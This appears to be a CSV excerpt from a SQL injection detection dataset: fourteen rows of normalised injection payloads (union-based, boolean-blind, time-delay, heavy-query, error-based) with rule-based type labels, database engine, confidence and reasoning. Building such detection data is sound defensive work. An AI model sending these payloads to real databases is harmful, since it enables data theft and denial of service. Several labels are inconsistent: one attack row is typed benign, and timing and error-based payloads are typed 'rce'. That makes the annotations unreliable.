row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1410,1'|| ( select 'omeg' from dual where 4751 = 4751,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1411,"1"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""ijag"" = ""ijag",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
1412,"-2314%' ) ) union all select 4612,4612--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1413,1%' and 7533 = 7533 and '%' = ',1,,boolean_blind,generic,0.95,7533 = 7533 and detected — boolean_blind injection (priority 8) on generic,rule-based
1414,"1',extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1415,"1' ) as eymt where 3911 = 3911 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
1416,"1' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,,rce,generic,0.95,0x544d5a4c detected — rce injection (priority 1) on generic,rule-based
1417,"1' ) where 8211 = 8211 union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1418,"-1083' ) union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1419,"-6561"" ) ) ) or 6872 = 6872 and ( ( ( ""azqp"" like ""azqp",1,,boolean_blind,generic,0.95,"6872 = 6872 and, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
1420,"1%"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""%"" = """,1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
1421,"1 ) ) as kycl where 8008 = 8008 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
1422,"1' ) ) ) and elt ( 9041 = 6421,6421 ) and ( ( ( 'ixxg' like 'ixxg",1,,boolean_blind,generic,0.95,") and (, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
1423,"1 ) as attr where 8085 = 8085 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
